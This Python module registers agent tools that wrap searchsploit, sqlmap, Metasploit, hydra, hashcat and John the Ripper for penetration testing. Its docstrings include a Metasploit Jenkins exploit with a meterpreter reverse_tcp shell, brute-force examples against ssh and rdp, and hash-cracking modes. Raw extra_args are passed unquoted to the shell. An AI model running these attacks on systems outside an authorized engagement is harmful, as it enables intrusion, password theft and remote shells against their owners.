"""Vulnerability & exploitation tools: searchsploit, sqlmap, msfconsole, hydra, hashcat, john.

These tools are for AUTHORIZED security testing only. Everything they run is
logged in the tool output so engagements remain reproducible.
"""

from __future__ import annotations

import shlex

from . import run_shell

DEFAULT_PASSLIST = "/usr/share/wordlists/rockyou.txt"


def build_sqlmap_command(
    url: str,
    data: str | None,
    level: int,
    risk: int,
    cookie: str | None,
    forms: bool,
    extra_args: str,
) -> str:
    parts = [
        "sqlmap",
        "-u",
        shlex.quote(url),
        "--batch",
        f"--level={int(level)}",
        f"--risk={int(risk)}",
    ]
    if data:
        parts += ["--data", shlex.quote(data)]
    if cookie:
        parts += ["--cookie", shlex.quote(cookie)]
    if forms:
        parts.append("--forms")
    if extra_args:
        parts.append(extra_args.strip())
    return " ".join(p for p in parts if p)


def build_hydra_command(
    target: str,
    service: str,
    port: int | None,
    users: str | None,
    userlist: str | None,
    passwords: str | None,
    passlist: str | None,
    extra_args: str,
) -> str:
    if not (userlist or users):
        raise ValueError("provide 'users' (single login) or 'userlist' (path to a user wordlist)")
    if not (passlist or passwords):
        raise ValueError(
            "provide 'passwords' (single password) or 'passlist' (path to a password wordlist)"
        )
    parts = ["hydra"]
    parts += ["-L", shlex.quote(userlist)] if userlist else ["-l", shlex.quote(users)]
    parts += ["-P", shlex.quote(passlist)] if passlist else ["-p", shlex.quote(passwords)]
    if port:
        parts += ["-s", str(port)]
    if extra_args:
        parts.append(extra_args.strip())
    parts.append(f"{service}://{shlex.quote(target)}")
    return " ".join(p for p in parts if p)


def build_hashcat_command(
    hash_file: str, mode: int, wordlist: str | None, mask: str | None, extra_args: str
) -> str:
    if not (wordlist or mask):
        raise ValueError(
            "provide 'wordlist' (dictionary attack) or 'mask' (brute-force, e.g. '?a?a?a?a?a?a')"
        )
    attack = "-a 3" if mask else "-a 0"
    candidate = mask or wordlist
    parts = [
        "hashcat",
        "-m",
        str(int(mode)),
        attack,
        shlex.quote(hash_file),
        shlex.quote(candidate),
    ]
    if extra_args:
        parts.append(extra_args.strip())
    return " ".join(p for p in parts if p)


def register(mcp) -> None:
    @mcp.tool
    async def searchsploit_search(
        query: str,
        json_output: bool = False,
        extra_args: str = "",
        timeout_seconds: int | None = None,
    ) -> str:
        """Search the local Exploit-DB mirror for public exploits matching a service/software.

        Args:
            query: what to look for, e.g. "Apache 2.4.49", "openssh 7", "wordpress plugin".
            json_output: emit machine-readable JSON (-j) - easier to parse for follow-up steps.
            extra_args: extra raw searchsploit flags, e.g. "--exclude-poc" or "--nmap file.xml".
            timeout_seconds: override the per-command timeout.
        """
        command = f"searchsploit {shlex.quote(query)}"
        if json_output:
            command += " -j"
        if extra_args:
            command += f" {extra_args.strip()}"
        return await run_shell(command, timeout_seconds)

    @mcp.tool
    async def sqlmap_scan(
        url: str,
        data: str | None = None,
        level: int = 1,
        risk: int = 1,
        cookie: str | None = None,
        forms: bool = False,
        extra_args: str = "",
        timeout_seconds: int | None = None,
    ) -> str:
        """Detect and exploit SQL injection with sqlmap (authorized targets only).

        Args:
            url: target URL with a parameter, e.g. "http://10.0.0.5/item.php?id=1".
            data: POST body, e.g. "user=admin&pass=test" (switches sqlmap to POST testing).
            level: 1-5, tests more injection points (headers/cookies) at higher levels.
            risk: 1-3, more invasive payloads at higher risk.
            cookie: session cookie string, e.g. "PHPSESSID=abc123".
            forms: parse and test HTML forms found on the page.
            extra_args: extra raw sqlmap flags, e.g. "--dbs --threads=5".
            timeout_seconds: override the per-command timeout (sqlmap runs can be long).
        """
        return await run_shell(
            build_sqlmap_command(url, data, level, risk, cookie, forms, extra_args),
            timeout_seconds,
        )

    @mcp.tool
    async def msf_run(
        console_commands: str,
        timeout_seconds: int | None = None,
    ) -> str:
        """Run Metasploit Framework console commands non-interactively (msfconsole -q -x).

        Args:
            console_commands: msfconsole commands, one per line or separated by ';'.
                Example: "use exploit/multi/http/jenkins_script_console; set RHOSTS 10.0.0.5;
                set PAYLOAD meterpreter/reverse_tcp; run". An 'exit' is appended automatically.
            timeout_seconds: override the per-command timeout (msfconsole startup alone takes
                ~30s; give sessions time - 900s+ recommended).
        """
        quoted = shlex.quote(console_commands.rstrip() + "\nexit")
        return await run_shell(f"msfconsole -q -x {quoted}", timeout_seconds)

    @mcp.tool
    async def hydra_attack(
        target: str,
        service: str,
        port: int | None = None,
        users: str = "admin",
        userlist: str | None = None,
        passwords: str | None = None,
        passlist: str = DEFAULT_PASSLIST,
        extra_args: str = "",
        timeout_seconds: int | None = None,
    ) -> str:
        """Password-spray / brute-force a network service with hydra (authorized targets only).

        Args:
            target: host or IP.
            service: protocol module, e.g. "ssh", "ftp", "mysql", "rdp", "smtp", "http-get".
            port: target port if non-standard (hydra guesses the default otherwise).
            users: single username (ignored if userlist is set).
            userlist: path to a username wordlist, e.g. /usr/share/seclists/Usernames/top-usernames-shortlist.txt.
            passwords: single password (ignored if passlist is set).
            passlist: path to a password wordlist (default rockyou). NOTE: on Parrot the file ships
                gzipped - run `gunzip /usr/share/wordlists/rockyou.txt.gz` once if it is missing.
            extra_args: extra raw hydra flags, e.g. "-t 8 -f -V".
            timeout_seconds: override the per-command timeout.
        """
        return await run_shell(
            build_hydra_command(
                target, service, port, users, userlist, passwords, passlist, extra_args
            ),
            timeout_seconds,
        )

    @mcp.tool
    async def hashcat_crack(
        hash_file: str,
        mode: int,
        wordlist: str | None = None,
        mask: str | None = None,
        extra_args: str = "",
        timeout_seconds: int | None = None,
    ) -> str:
        """Crack hashes with hashcat (GPU/CPU). Find -m mode numbers with `hashcat -h` or run_command.

        Args:
            hash_file: path to the file containing hashes.
            mode: hashcat mode number, e.g. 0 (MD5), 100 (SHA1), 1400 (SHA256),
                1800 (sha512crypt), 22000 (WPA-PBKDF2).
            wordlist: dictionary wordlist, e.g. /usr/share/wordlists/rockyou.txt.
            mask: brute-force mask instead of a wordlist, e.g. "?u?l?l?l?l?d?d?d".
            extra_args: extra raw hashcat flags, e.g. "--force" (CPU-only VMs), "--show".
            timeout_seconds: override the per-command timeout.
        """
        return await run_shell(
            build_hashcat_command(hash_file, mode, wordlist, mask, extra_args),
            timeout_seconds,
        )

    @mcp.tool
    async def john_crack(
        hash_file: str,
        wordlist: str | None = None,
        format: str | None = None,
        show: bool = False,
        extra_args: str = "",
        timeout_seconds: int | None = None,
    ) -> str:
        """Crack hashes with John the Ripper. CPU-based, suited to shadow files and archives.

        Args:
            hash_file: path to hashes (unshadow if needed: `unshadow passwd shadow > hashes`).
            wordlist: dictionary, e.g. /usr/share/wordlists/rockyou.txt (default: john's rules).
            format: john format, e.g. "sha512crypt", "md5crypt", "Raw-MD5" (omit for auto-detect).
            show: True -> just print already-cracked hashes (john --show).
            extra_args: extra raw john flags, e.g. "--rules".
            timeout_seconds: override the per-command timeout.
        """
        if show:
            parts = ["john", "--show"]
            if format:
                parts.append(f"--format={shlex.quote(format)}")
            parts.append(shlex.quote(hash_file))
            return await run_shell(" ".join(parts), timeout_seconds)
        parts = ["john"]
        if wordlist:
            parts.append(f"--wordlist={shlex.quote(wordlist)}")
        if format:
            parts.append(f"--format={shlex.quote(format)}")
        parts.append(shlex.quote(hash_file))
        if extra_args:
            parts.append(extra_args.strip())
        return await run_shell(" ".join(p for p in parts if p), timeout_seconds)
